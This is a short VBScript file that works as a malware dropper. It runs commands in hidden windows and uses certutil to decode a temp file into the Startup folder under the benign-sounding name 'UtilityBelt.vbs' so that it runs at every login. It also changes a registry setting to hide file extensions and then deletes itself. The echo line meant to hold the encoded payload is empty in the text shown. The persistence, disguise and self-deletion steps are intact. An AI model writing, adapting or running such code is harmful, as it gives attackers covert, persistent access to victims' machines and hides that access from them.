Set WshShell = CreateObject("WScript.Shell")
Dim f
WshShell.Run "%comspec% /c echo  > %TEMP%\log1", 0, True
WshShell.Run "cmd /c certutil -decode %TEMP%\log1 " & """%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\UtilityBelt.vbs""", 0, True
WshShell.Run "cmd /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f", 0, True
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScript = Wscript.ScriptFullName
objFSO.DeleteFile(strScript)
